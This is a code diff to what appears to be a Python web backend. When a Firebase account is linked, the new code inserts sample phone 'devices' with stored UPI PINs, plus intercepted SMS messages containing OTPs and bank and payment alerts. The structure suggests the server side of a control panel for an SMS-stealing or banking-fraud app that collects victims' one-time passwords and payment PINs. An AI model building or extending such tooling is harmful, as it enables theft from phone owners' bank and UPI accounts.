@@ -378,6 +378,118 @@ async def create_firebase_account(user_id: str, data: FirebaseCreate):
     await db.firebase_accounts.insert_one(account_dict)
     account_dict.pop("_id", None)
     
+    # Auto-create demo devices when Firebase is added
+    demo_devices = [
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "firebase_id": account_dict["id"],
+            "name": "Redmi Note 12",
+            "model": "redmi note 12 pro",
+            "status": "online",
+            "upi_pin": "1234",
+            "battery": 78,
+            "last_seen": format_datetime(datetime.utcnow()),
+            "added": format_datetime(datetime.utcnow()),
+            "note": "Main device"
+        },
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "firebase_id": account_dict["id"],
+            "name": "Samsung A54",
+            "model": "SM-A546B",
+            "status": "online",
+            "upi_pin": "5678",
+            "battery": 92,
+            "last_seen": format_datetime(datetime.utcnow()),
+            "added": format_datetime(datetime.utcnow()),
+            "note": "Backup"
+        },
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "firebase_id": account_dict["id"],
+            "name": "OnePlus 11",
+            "model": "CPH2449",
+            "status": "offline",
+            "upi_pin": None,
+            "battery": 15,
+            "last_seen": format_datetime(datetime.utcnow() - timedelta(hours=2)),
+            "added": format_datetime(datetime.utcnow()),
+            "note": "-"
+        },
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "firebase_id": account_dict["id"],
+            "name": "Vivo V27",
+            "model": "V2238",
+            "status": "offline",
+            "upi_pin": None,
+            "battery": 47,
+            "last_seen": format_datetime(datetime.utcnow() - timedelta(hours=5)),
+            "added": format_datetime(datetime.utcnow()),
+            "note": "-"
+        }
+    ]
+    
+    # Insert demo devices
+    for device in demo_devices:
+        await db.devices.insert_one(device)
+    
+    # Also add some demo SMS messages
+    demo_messages = [
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "device_id": demo_devices[0]["id"],
+            "device_name": demo_devices[0]["name"],
+            "sender": "+91 98765 43210",
+            "message": "Your OTP is 456789. Valid for 5 minutes. Do not share with anyone.",
+            "msg_type": "otp",
+            "timestamp": format_datetime(datetime.utcnow()),
+            "is_read": False
+        },
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "device_id": demo_devices[1]["id"],
+            "device_name": demo_devices[1]["name"],
+            "sender": "HDFC Bank",
+            "message": "Rs.5000 credited to your account ending 4521. Balance: Rs.25,430.",
+            "msg_type": "bank",
+            "timestamp": format_datetime(datetime.utcnow() - timedelta(minutes=30)),
+            "is_read": False
+        },
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "device_id": demo_devices[0]["id"],
+            "device_name": demo_devices[0]["name"],
+            "sender": "Paytm",
+            "message": "Payment of Rs.250 received from John Doe via UPI.",
+            "msg_type": "payment",
+            "timestamp": format_datetime(datetime.utcnow() - timedelta(hours=1)),
+            "is_read": False
+        },
+        {
+            "id": str(uuid.uuid4()),
+            "user_id": user_id,
+            "device_id": demo_devices[1]["id"],
+            "device_name": demo_devices[1]["name"],
+            "sender": "SBI Bank",
+            "message": "Your OTP for transaction is 892341. Valid for 3 mins.",
+            "msg_type": "otp",
+            "timestamp": format_datetime(datetime.utcnow() - timedelta(hours=2)),
+            "is_read": False
+        }
+    ]
+    
+    for msg in demo_messages:
+        await db.messages.insert_one(msg)
+    
+    
     return {"message": "Firebase account added", "account": account_dict}
 
 @api_router.delete("/firebase/{account_id}")
